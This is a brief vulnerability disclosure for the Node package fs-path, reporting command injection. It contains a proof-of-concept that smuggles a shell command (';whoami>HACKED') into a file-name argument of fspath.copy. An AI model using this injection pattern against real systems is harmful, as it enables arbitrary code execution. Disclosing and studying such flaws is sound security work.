# Description
```fs-path``` is a usefull file utility in node. This package is vulnerable to ```command injection``` which may lead to ```arbitrary code execution```.

# Proof-of-Concept
```
const fspath = require('fs-path');
fspath.copy('../file2','./;whoami>HACKED', function(err){
        console.log('ok');
});
```